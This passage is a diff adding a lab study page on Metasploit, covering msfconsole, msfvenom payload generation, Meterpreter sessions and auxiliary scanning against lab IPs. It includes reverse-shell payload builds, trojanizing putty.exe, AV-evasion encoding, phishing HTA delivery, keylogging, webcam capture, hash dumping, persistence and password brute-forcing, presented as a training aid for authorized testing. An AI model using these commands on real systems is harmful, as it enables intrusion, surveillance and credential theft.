@@ -1,0 +1,1709 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Metasploit — SOC Notes</title>
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    .xref { display:inline; color:var(--accent,#3b82f6); font-size:.75em; font-weight:600; border:1px solid var(--accent,#3b82f6); border-radius:3px; padding:1px 5px; margin-left:4px; text-decoration:none; cursor:pointer; white-space:nowrap; opacity:.85; }
+    .xref:hover { background:rgba(59,130,246,.15); opacity:1; }
+    .xref-group { color:#8b949e; font-size:.82em; margin-left:2px; }
+    td .xref-group { display:block; margin-top:3px; }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <a href="index.html" class="nav-brand">
+    <span class="icon">⬡</span> SOC Notes
+  </a>
+  <button id="sb-toggle" class="nav-toggle" onclick="toggleSidebar()">☰</button>
+  <div class="nav-links">
+    <a href="index.html">Home</a>
+    <a href="psaa.html">PSAA</a>
+    <a href="security-onion.html">Security Onion</a>
+    <a href="splunk.html">Splunk</a>
+    <a href="elk.html">ELK Stack</a>
+    <a href="openvas.html">OpenVAS</a>
+    <a href="kali.html">Kali Linux</a>
+    <a href="metasploit.html" class="active">Metasploit</a>
+    <a href="nmap.html">Nmap</a>
+    <a href="wireshark.html">Wireshark</a>
+    <a href="snort.html">Snort</a>
+    <a href="ossec.html">OSSEC</a>
+    <a href="log-sources.html">Log Sources</a>
+  </div>
+</nav>
+
+<div class="layout">
+  <aside id="sb" class="sidebar">
+    <div class="sb-title">Metasploit</div>
+    <nav id="sb-nav"></nav>
+  </aside>
+
+  <main id="main" class="main">
+    <div id="content-area"></div>
+  </main>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 01 -->
+<template id="tpl-overview">
+<article class="topic">
+  <h2>Overview &amp; Architecture</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Metasploit targets L3 IP addresses, connects over L4 TCP/UDP ports, and exploits L7 application services and protocols to deliver payloads.</span>
+  </div>
+
+  <p>Metasploit Framework is the world's most widely used penetration testing platform. It provides a consistent interface to exploit vulnerabilities, generate payloads, manage sessions, and run post-exploitation modules. <strong>Only use against systems you own or have explicit written authorization to test.</strong></p>
+
+  <h3>Core Components</h3>
+  <table>
+    <thead><tr><th>Component</th><th>Purpose</th><th>Notes</th></tr></thead>
+    <tbody>
+      <tr><td><code>msfconsole</code></td><td>Primary interactive CLI — access all modules, sessions, DB</td><td>Most powerful interface; all examples in this notebook use msfconsole</td></tr>
+      <tr><td><code>msfvenom</code></td><td>Standalone payload generator &amp; encoder</td><td>Replaced msfpayload + msfencode; critical for standalone payload delivery</td></tr>
+      <tr><td><code>msfdb</code></td><td>PostgreSQL database management</td><td>Stores hosts, services, vulns, sessions from scans and exploits</td></tr>
+      <tr><td><code>Metasploit Pro</code></td><td>Commercial GUI with automation, reporting, pivoting UI</td><td>Paid — free Framework (msfconsole) covers 95% of use cases</td></tr>
+      <tr><td>Rex</td><td>Ruby library underpinning all socket/protocol handling</td><td>Internal library — not interacted with directly</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Module Types</h3>
+  <table>
+    <thead><tr><th>Type</th><th>Path Prefix</th><th>What It Does</th></tr></thead>
+    <tbody>
+      <tr><td><strong>exploit</strong></td><td><code>exploit/</code></td><td>Delivers payload by exploiting a vulnerability — the attack itself</td></tr>
+      <tr><td><strong>payload</strong></td><td><code>payload/</code></td><td>Code that runs on the target after exploitation (shell, Meterpreter, etc.)</td></tr>
+      <tr><td><strong>auxiliary</strong></td><td><code>auxiliary/</code></td><td>No payload — scanners, fuzzers, credential sprayers, DOS modules, data gathering</td></tr>
+      <tr><td><strong>post</strong></td><td><code>post/</code></td><td>Run after gaining a session — credential dumping, pivoting, persistence</td></tr>
+      <tr><td><strong>encoder</strong></td><td><code>encoder/</code></td><td>Obfuscate payloads to evade signature-based detection (limited modern effectiveness)</td></tr>
+      <tr><td><strong>nop</strong></td><td><code>nop/</code></td><td>No-operation sleds for padding exploits — rarely needed manually</td></tr>
+      <tr><td><strong>evasion</strong></td><td><code>evasion/</code></td><td>Dedicated AV evasion techniques — more advanced than encoders</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Installation &amp; Database Setup</h3>
+  <pre><code># Kali — Metasploit is pre-installed
+msfconsole --version
+
+# Initialize/start database
+sudo msfdb init       # first-time setup (creates PostgreSQL DB)
+sudo msfdb start      # start DB service
+sudo msfdb status     # verify running
+
+# Inside msfconsole: verify DB connection
+db_status
+# postgresql connected to msf
+
+# Update to latest modules
+sudo apt update && sudo apt install -y metasploit-framework</code></pre>
+
+  <h3>Lab Network Reference</h3>
+  <table>
+    <thead><tr><th>Host</th><th>IP</th><th>Role</th></tr></thead>
+    <tbody>
+      <tr><td>Kali Linux</td><td>192.168.56.10</td><td>Attacker — runs msfconsole</td></tr>
+      <tr><td>Security Onion</td><td>192.168.56.20</td><td>Defender — monitors for Metasploit signatures</td></tr>
+      <tr><td>Windows 10</td><td>192.168.56.30</td><td>Target — authorized test machine</td></tr>
+      <tr><td>Metasploitable 2</td><td>192.168.56.40</td><td>Intentionally vulnerable Linux (optional)</td></tr>
+    </tbody>
+  </table>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Understanding the Framework</h4>
+      <ul>
+        <li>Metasploit bridges L3/L4 network access to L7 exploit delivery — know the target IP and port before selecting a module</li>
+        <li>Always initialize the PostgreSQL database before scanning: <code>sudo msfdb init</code></li>
+        <li>Use <code>msfconsole -q</code> to skip the banner and get a clean prompt faster</li>
+      </ul>
+      <pre><code>sudo msfdb init && sudo msfdb start
+msfconsole -q
+db_status          <span class="cm"># confirm: postgresql connected to msf</span>
+version            <span class="cm"># verify framework version</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Using Workspaces and Module Types Strategically</h4>
+      <ul>
+        <li>Separate engagements with workspaces to prevent host/service data from mixing across labs</li>
+        <li>Know when to use auxiliary (no payload, L3/L4 recon) vs exploit (full L7 attack chain) modules</li>
+        <li>Use <code>db_nmap</code> inside msfconsole to auto-populate the hosts and services tables</li>
+      </ul>
+      <pre><code>workspace -a lab_win10
+db_nmap -sC -sV -p 22,80,443,445 192.168.56.30
+hosts              <span class="cm"># view discovered hosts stored in DB</span>
+services           <span class="cm"># view open ports/services</span></code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Scripting and API-Driven Automation</h4>
+      <ul>
+        <li>Write resource scripts (.rc) to automate full engagement sequences from handler setup to post-exploitation</li>
+        <li>Use <code>msfrpcd</code> with <code>pymetasploit3</code> to drive Metasploit programmatically from external Python scripts</li>
+        <li>Chain modules: auxiliary scanner → confirm vulnerability → launch exploit → run post modules in sequence via resource script</li>
+      </ul>
+      <pre><code>msfconsole -r full_engagement.rc   <span class="cm"># run automated script at startup</span>
+msfrpcd -P secret -S -a 127.0.0.1  <span class="cm"># start RPC daemon for API access</span>
+makerc engagement_20240315.rc       <span class="cm"># save current session commands as reusable script</span></code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 02 -->
+<template id="tpl-msfconsole">
+<article class="topic">
+  <h2>msfconsole Workflow &amp; Navigation</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">msfconsole is an application-layer framework interface — module selection, option configuration, and resource scripting all operate at L7 before any network traffic is generated.</span>
+  </div>
+  <p>msfconsole is the primary interface. It provides tab-completion, a module context system, and a built-in database for tracking engagements.</p>
+
+  <h3>Launch &amp; Core Commands</h3>
+  <pre><code># Launch (quiet mode skips banner)
+msfconsole -q
+msfconsole -r script.rc    # run resource script at startup
+
+# Navigation
+help                        # show all commands
+help search                 # help for a specific command
+?                           # alias for help
+
+# Search for modules
+search type:exploit platform:windows name:smb
+search CVE-2021-34527        # PrintNightmare
+search ms17_010              # EternalBlue by name
+search eternalblue           # by common name
+search type:auxiliary name:smb_ms17_010   # auxiliary version
+
+# Search result columns: #, Name, Disclosure Date, Rank, Check, Description
+# Rank: manual < low < average < normal < good < great < excellent</code></pre>
+
+  <h3>Module Selection &amp; Options</h3>
+  <pre><code># Select a module (use path OR number from search results)
+use exploit/windows/smb/ms17_010_eternalblue
+use 0       # if 0 appeared in search results
+
+# Module info
+info                         # full description, options, authors, references
+info -d                      # open module documentation in browser
+
+# View configurable options
+show options                 # required + optional options
+show advanced                # advanced options (timeouts, verbosity, encoders)
+show payloads                # list compatible payloads for this exploit
+show targets                 # list supported target OS/version combinations
+
+# Set options
+set RHOSTS 192.168.56.30
+set RPORT 445
+set LHOST 192.168.56.10
+set LPORT 4444
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set TARGET 0                 # select target index from show targets
+
+# Global options (persist across module changes)
+setg LHOST 192.168.56.10
+setg RHOSTS 192.168.56.30
+
+# Unset options
+unset RHOSTS
+unsetg LHOST
+
+# View current settings
+show options
+options</code></pre>
+
+  <h3>Running Modules</h3>
+  <pre><code># Run exploit
+run              # alias for exploit
+exploit
+exploit -j       # run as background job
+exploit -z       # run exploit, don't interact with session after
+
+# Check if target is vulnerable (not all modules implement check)
+check
+
+# Run auxiliary module (no payload needed)
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.56.30
+run
+
+# Cancel running exploit
+Ctrl+C</code></pre>
+
+  <h3>Resource Scripts (.rc files)</h3>
+  <pre><code># Resource scripts automate repetitive sequences
+# Create a script: setup_listener.rc
+cat > setup_listener.rc << 'EOF'
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.10
+set LPORT 4444
+set ExitOnSession false
+run -j
+EOF
+
+# Run at startup
+msfconsole -r setup_listener.rc
+
+# Run inside msfconsole
+resource setup_listener.rc
+
+# makerc — save your current session commands as a resource script
+makerc my_session.rc</code></pre>
+
+  <h3>Workspaces — Organize by Engagement</h3>
+  <pre><code"># Workspaces separate data from different engagements
+workspace           # list workspaces (* = current)
+workspace -a lab1   # create and switch to lab1
+workspace lab1      # switch to existing workspace
+workspace -d lab1   # delete workspace
+
+# All DB operations (hosts, services, vulns) scoped to current workspace</code></pre>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Navigation and Module Selection</h4>
+      <ul>
+        <li>Use <code>search</code> with type and name filters to find modules quickly rather than guessing paths</li>
+        <li>Always run <code>show options</code> after selecting a module — RHOSTS and PAYLOAD are the most commonly forgotten required fields</li>
+        <li>Use <code>use 0</code> to select the first search result instead of typing the full module path</li>
+      </ul>
+      <pre><code>search type:exploit name:ms17_010
+use 0
+show options       <span class="cm"># review all required fields</span>
+set RHOSTS 192.168.56.30
+set LHOST 192.168.56.10</code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Global Options and Resource Scripts</h4>
+      <ul>
+        <li>Use <code>setg</code> to persist LHOST across module changes — saves time on multi-module engagements</li>
+        <li>Save a session's commands with <code>makerc</code> and replay with <code>resource</code> for repeatability</li>
+        <li>Run exploits with <code>exploit -j</code> to background them as jobs and keep the console free</li>
+      </ul>
+      <pre><code>setg LHOST 192.168.56.10         <span class="cm"># persists across all modules</span>
+setg RHOSTS 192.168.56.30
+exploit -j                        <span class="cm"># run as background job</span>
+jobs                              <span class="cm"># list running jobs</span>
+makerc lab_session.rc             <span class="cm"># save current commands</span></code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Module Ranking and Targeted Searches</h4>
+      <ul>
+        <li>Filter searches by rank (excellent/great/good) to prioritize reliable, low-crash-risk exploits against live targets</li>
+        <li>Use <code>info -d</code> to open module documentation and understand targets, requirements, and detection artifacts before running</li>
+        <li>Combine CVE search with <code>show targets</code> to confirm exact OS/service version match before executing an exploit</li>
+      </ul>
+      <pre><code>search type:exploit rank:excellent platform:windows name:smb
+info -d                           <span class="cm"># open full docs in browser</span>
+show targets                      <span class="cm"># confirm exact version support</span>
+show advanced                     <span class="cm"># tune timeouts and encoder settings</span></code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 03 -->
+<template id="tpl-payloads">
+<article class="topic">
+  <h2>Payloads &amp; msfvenom</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Payloads are L7 application-layer code — shellcode and Meterpreter stages execute inside the target process after L3/L4 delivery. msfvenom generates payload files before any network interaction occurs.</span>
+  </div>
+  <p>Payloads are the code that runs on the target after exploitation. msfvenom generates standalone payload files for delivery outside of msfconsole.
+    <a href="#" class="xref" onclick="loadTopic('sessions'); return false;">Managing sessions ↗</a>
+  </p>
+
+  <h3>Payload Naming Convention</h3>
+  <pre><code># Format: platform/architecture/payload_type/delivery_method
+# Examples:
+windows/x64/meterpreter/reverse_tcp    # Windows 64-bit, Meterpreter, staged, reverse TCP
+windows/meterpreter/reverse_https      # Windows 32-bit, Meterpreter, staged, reverse HTTPS
+linux/x86/shell_reverse_tcp            # Linux 32-bit, raw shell, single-stage
+osx/x64/meterpreter_reverse_tcp        # macOS 64-bit, Meterpreter
+
+# Staged vs Stageless:
+# Staged (/)  : small stager sent first → connects back → downloads full payload
+#               e.g., windows/x64/meterpreter/reverse_tcp
+# Stageless (_): entire payload in one piece — larger but doesn't need callback for stage
+#               e.g., windows/x64/meterpreter_reverse_tcp   (note underscore)</code></pre>
+
+  <h3>Common Payloads Reference</h3>
+  <table>
+    <thead><tr><th>Payload</th><th>Best For</th><th>Notes</th></tr></thead>
+    <tbody>
+      <tr><td><code>windows/x64/meterpreter/reverse_tcp</code></td><td>Windows standard exploitation</td><td>Feature-rich; requires multi/handler; staged</td></tr>
+      <tr><td><code>windows/x64/meterpreter/reverse_https</code></td><td>Bypassing egress firewall rules</td><td>Blends with HTTPS traffic; certificate can be customized</td></tr>
+      <tr><td><code>windows/x64/shell_reverse_tcp</code></td><td>Lightweight Windows shell</td><td>Raw cmd.exe shell; no Meterpreter features</td></tr>
+      <tr><td><code>linux/x64/meterpreter/reverse_tcp</code></td><td>Linux exploitation</td><td>Full Meterpreter on Linux</td></tr>
+      <tr><td><code>linux/x86/shell_reverse_tcp</code></td><td>Older 32-bit Linux targets</td><td>Compatible with most Linux distributions</td></tr>
+      <tr><td><code>java/jsp_shell_reverse_tcp</code></td><td>Tomcat/Java web app exploitation</td><td>Deploy as WAR file via Tomcat manager</td></tr>
+      <tr><td><code>php/meterpreter/reverse_tcp</code></td><td>PHP web shells</td><td>After uploading PHP file to web server</td></tr>
+      <tr><td><code>python/meterpreter/reverse_tcp</code></td><td>Python-capable targets</td><td>Cross-platform where Python is installed</td></tr>
+    </tbody>
+  </table>
+
+  <h3>msfvenom — Standalone Payload Generation</h3>
+  <pre><code># List all payloads
+msfvenom -l payloads
+
+# List formats (output file types)
+msfvenom -l formats
+
+# List encoders
+msfvenom -l encoders
+
+# Generate Windows EXE payload (reverse Meterpreter)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o payload.exe
+
+# Generate Windows service EXE (for service exploitation)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe-service -o svc_payload.exe
+
+# Generate Linux ELF
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f elf -o payload.elf
+chmod +x payload.elf
+
+# Generate PHP web shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw -o shell.php
+
+# Generate Python payload
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw -o shell.py
+
+# Generate PowerShell payload (for clipboard/web delivery)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f psh -o shell.ps1
+
+# Generate HTA (HTML Application — opened in Internet Explorer/mshta.exe)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f hta-psh -o payload.hta
+
+# Inject into existing executable (trojanize)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -x putty.exe -k -f exe -o trojan_putty.exe
+
+# Encode payload (basic AV evasion)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe
+
+# List payload options
+msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options</code></pre>
+
+  <h3>Catching the Connection — multi/handler</h3>
+  <pre><code># Always set up handler BEFORE delivering payload
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp     # must match payload exactly
+set LHOST 192.168.56.10
+set LPORT 4444
+set ExitOnSession false    # don't stop listening after first session
+run -j                     # run as background job (allows multiple connections)
+
+# View active jobs
+jobs
+jobs -i 0    # view job details
+
+# Kill a job
+jobs -k 0</code></pre>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Staged vs Stageless Payloads</h4>
+      <ul>
+        <li>Staged payloads (slash <code>/</code>) send a tiny stager first, then download the full Meterpreter over L4 TCP — less detectable but requires network callback</li>
+        <li>Stageless payloads (underscore <code>_</code>) embed the full payload in one file — larger but self-contained</li>
+        <li>Always set up <code>multi/handler</code> before delivering the payload — the handler must be listening first</li>
+      </ul>
+      <pre><code>use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.10
+set LPORT 4444
+set ExitOnSession false
+run -j             <span class="cm"># listen as background job</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Generating Payloads with msfvenom</h4>
+      <ul>
+        <li>Match the <code>-f</code> format to the delivery method: <code>exe</code> for standalone, <code>raw</code> for shellcode injection, <code>psh</code> for PowerShell</li>
+        <li>Use <code>-x</code> to inject a payload into a legitimate binary to reduce suspicion during delivery</li>
+        <li>Use HTTPS payloads (<code>reverse_https</code>) to blend C2 traffic with normal web traffic on port 443</li>
+      </ul>
+      <pre><code>msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=192.168.56.10 LPORT=443 -f exe -o payload_https.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.56.10 LPORT=4444 \
+  -x /usr/share/windows-binaries/plink.exe -k -f exe -o trojan.exe</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Multi-Format Payload Delivery</h4>
+      <ul>
+        <li>Generate HTA (<code>hta-psh</code>) or VBA macro formats for phishing-based L7 payload delivery via browser or Office</li>
+        <li>Use encoding (<code>-e x64/xor_dynamic -i 10</code>) as a first-pass obfuscation layer — note it has limited effectiveness against behavioral AV</li>
+        <li>Generate shellcode in raw format for manual injection into a custom loader, bypassing MSF's known PE signatures entirely</li>
+      </ul>
+      <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.56.10 LPORT=4444 -f raw -o shellcode.bin  <span class="cm"># raw shellcode bytes</span>
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.56.10 LPORT=4444 -f hta-psh -o delivery.hta
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.56.10 LPORT=4444 -e x64/xor_dynamic -i 10 -f exe -o enc.exe</code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 04 -->
+<template id="tpl-sessions">
+<article class="topic">
+  <h2>Session Management &amp; Meterpreter</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Meterpreter runs entirely in memory as an L7 application-layer agent — commands like getuid, hashdump, and migrate operate within the target OS process space with no L2–L4 awareness needed.</span>
+  </div>
+  <p>Sessions are active connections to compromised targets. Meterpreter is Metasploit's advanced post-exploitation payload that runs entirely in memory.
+    <a href="#" class="xref" onclick="loadTopic('post'); return false;">Post-exploitation modules ↗</a>
+  </p>
+
+  <h3>Session Commands</h3>
+  <pre><code># View all sessions
+sessions
+sessions -l       # verbose list (type, tunnel, info)
+
+# Interact with a session
+sessions -i 1     # interact with session 1 (brings up meterpreter prompt)
+
+# Background current session (return to msfconsole)
+background        # or Ctrl+Z
+
+# Kill a session
+sessions -k 1     # kill session 1
+sessions -K       # kill all sessions
+
+# Run a command on a session without interacting
+sessions -C "getuid" -i 1          # single command
+sessions -C "sysinfo" -i 1,2,3     # multiple sessions
+
+# Upgrade raw shell to Meterpreter
+sessions -u 1     # attempt to upgrade session 1 to Meterpreter</code></pre>
+
+  <h3>Meterpreter — Core Commands</h3>
+  <table>
+    <thead><tr><th>Category</th><th>Command</th><th>Description</th></tr></thead>
+    <tbody>
+      <tr><td rowspan="4"><strong>System Info</strong></td>
+          <td><code>sysinfo</code></td><td>OS version, hostname, architecture, domain</td></tr>
+      <tr><td><code>getuid</code></td><td>Current user context (e.g., NT AUTHORITY\SYSTEM)</td></tr>
+      <tr><td><code>getpid</code></td><td>PID of current Meterpreter process</td></tr>
+      <tr><td><code>ps</code></td><td>List all running processes with PID, arch, user, path</td></tr>
+      <tr><td rowspan="3"><strong>Process</strong></td>
+          <td><code>migrate PID</code></td><td>Move Meterpreter into another process (stability, privileges)</td></tr>
+      <tr><td><code>execute -f cmd.exe -i</code></td><td>Execute program and interact with it</td></tr>
+      <tr><td><code>kill PID</code></td><td>Kill a process by PID</td></tr>
+      <tr><td rowspan="4"><strong>File System</strong></td>
+          <td><code>pwd</code> / <code>ls</code></td><td>Current directory / list files</td></tr>
+      <tr><td><code>cd C:\\Temp</code></td><td>Change directory (use double backslash in Meterpreter)</td></tr>
+      <tr><td><code>download secret.txt .</code></td><td>Download file from target to Kali</td></tr>
+      <tr><td><code>upload linpeas.sh /tmp/</code></td><td>Upload file from Kali to target</td></tr>
+      <tr><td rowspan="3"><strong>Network</strong></td>
+          <td><code>ipconfig</code></td><td>Network interfaces and IPs</td></tr>
+      <tr><td><code>netstat</code></td><td>Active connections</td></tr>
+      <tr><td><code>arp</code></td><td>ARP table — discover adjacent hosts</td></tr>
+      <tr><td rowspan="4"><strong>Privilege</strong></td>
+          <td><code>getsystem</code></td><td>Attempt SYSTEM privilege escalation (several techniques)</td></tr>
+      <tr><td><code>getprivs</code></td><td>List enabled privileges for current token</td></tr>
+      <tr><td><code>steal_token PID</code></td><td>Impersonate token from another process</td></tr>
+      <tr><td><code>rev2self</code></td><td>Revert to original token</td></tr>
+      <tr><td rowspan="2"><strong>Credential</strong></td>
+          <td><code>hashdump</code></td><td>Dump Windows SAM hashes (requires SYSTEM)</td></tr>
+      <tr><td><code>run post/windows/gather/credentials/credential_collector</code></td><td>Collect stored browser/application credentials</td></tr>
+      <tr><td rowspan="3"><strong>Pivoting</strong></td>
+          <td><code>portfwd add -l 8080 -p 80 -r 192.168.100.10</code></td><td>Forward local port 8080 → target internal host:80</td></tr>
+      <tr><td><code>route add 192.168.100.0/24 1</code></td><td>Route traffic to internal subnet through session 1</td></tr>
+      <tr><td><code>run auxiliary/server/socks_proxy SRVPORT=1080 VERSION=5</code></td><td>SOCKS5 proxy through Meterpreter</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Meterpreter — Interactive Shell &amp; Scripting</h3>
+  <pre><code># Drop to system shell
+shell
+# Then type: exit to return to Meterpreter
+
+# Run Meterpreter script / post module inline
+run post/windows/manage/enable_rdp    # enable RDP
+run post/multi/manage/shell_to_meterpreter
+run post/windows/gather/enum_logged_on_users
+
+# Take screenshot
+screenshot
+
+# Capture keystrokes
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+# Webcam capture (if available)
+webcam_list
+webcam_snap
+
+# Persistence (basic run key — noisy)
+run post/windows/manage/persistence_exe STARTUP=REGISTRY</code></pre>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Basic Session Interaction</h4>
+      <ul>
+        <li>Use <code>sessions -l</code> to list active sessions and <code>sessions -i N</code> to interact with session N</li>
+        <li>Press Ctrl+Z or type <code>background</code> to return to msfconsole without closing the session</li>
+        <li>Always run <code>getuid</code> immediately after getting a session to confirm your privilege level</li>
+      </ul>
+      <pre><code>sessions -l                       <span class="cm"># list all open sessions</span>
+sessions -i 1                     <span class="cm"># interact with session 1</span>
+meterpreter > getuid              <span class="cm"># who am I?</span>
+meterpreter > sysinfo             <span class="cm"># OS, hostname, architecture</span>
+meterpreter > background          <span class="cm"># return to msfconsole</span></code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Process Migration and Privilege Escalation</h4>
+      <ul>
+        <li>Migrate to a stable, long-running process (explorer.exe, svchost.exe) immediately to prevent payload death when the exploited process exits</li>
+        <li>Use <code>getsystem</code> to attempt automatic SYSTEM escalation via several built-in techniques</li>
+        <li>Use <code>steal_token PID</code> to impersonate a higher-privileged user's token without full privilege escalation</li>
+      </ul>
+      <pre><code>meterpreter > ps                  <span class="cm"># list processes with PIDs</span>
+meterpreter > migrate 3120        <span class="cm"># migrate to explorer.exe PID 3120</span>
+meterpreter > getsystem           <span class="cm"># attempt SYSTEM privilege escalation</span>
+meterpreter > getprivs            <span class="cm"># list enabled token privileges</span></code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Credential Dumping and Persistence</h4>
+      <ul>
+        <li>Run <code>hashdump</code> after achieving SYSTEM to extract NTLM hashes from the SAM database for pass-the-hash attacks</li>
+        <li>Use <code>sessions -C "cmd" -i 1,2,3</code> to run a command on multiple sessions simultaneously</li>
+        <li>Use <code>sessions -u N</code> to upgrade a raw shell session to a full Meterpreter session automatically</li>
+      </ul>
+      <pre><code>meterpreter > hashdump            <span class="cm"># dump SAM hashes (requires SYSTEM)</span>
+meterpreter > run post/windows/gather/credentials/credential_collector
+sessions -C "whoami" -i 1,2,3    <span class="cm"># run command on multiple sessions</span>
+sessions -u 2                     <span class="cm"># upgrade raw shell to Meterpreter</span></code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 05 -->
+<template id="tpl-auxiliary">
+<article class="topic">
+  <h2>Auxiliary Modules — Scanning &amp; Enumeration</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-note">Auxiliary modules operate at L3 (host/network discovery) and L4 (port scanning, TCP/UDP service probing) to enumerate targets before exploit selection.</span>
+  </div>
+  <p>Auxiliary modules perform reconnaissance, scanning, and credential testing without delivering a payload. Essential for structured engagements.
+    <a href="#" class="xref" onclick="loadTopic('msfconsole'); return false;">Basic module usage ↗</a>
+  </p>
+
+  <h3>Network Scanning</h3>
+  <pre><code># Port scanner (TCP connect — no raw socket needed)
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.56.0/24
+set PORTS 22,80,443,445,3389,8080
+set THREADS 50
+run
+
+# SYN scanner (stealth — requires root)
+use auxiliary/scanner/portscan/syn
+set RHOSTS 192.168.56.30
+set PORTS 1-1024
+run
+
+# SMB scanner — OS version + signing
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.56.0/24
+run
+
+# SMB EternalBlue check
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.56.30
+run
+
+# HTTP version detection
+use auxiliary/scanner/http/http_version
+set RHOSTS 192.168.56.0/24
+set PORTS 80,8080,8443
+run</code></pre>
+
+  <h3>Credential Attacks (Auxiliary)</h3>
+  <pre><code># SSH login scanner
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.56.30
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set THREADS 4
+run
+
+# SMB login tester
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 192.168.56.30
+set SMBUser administrator
+set PASS_FILE rockyou.txt
+set THREADS 4
+run
+
+# FTP login
+use auxiliary/scanner/ftp/ftp_login
+set RHOSTS 192.168.56.30
+set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/common_users_pass.txt
+run
+
+# HTTP basic auth
+use auxiliary/scanner/http/http_login
+set RHOSTS 192.168.56.30
+set AUTH_URI /admin/
+set USER_FILE users.txt
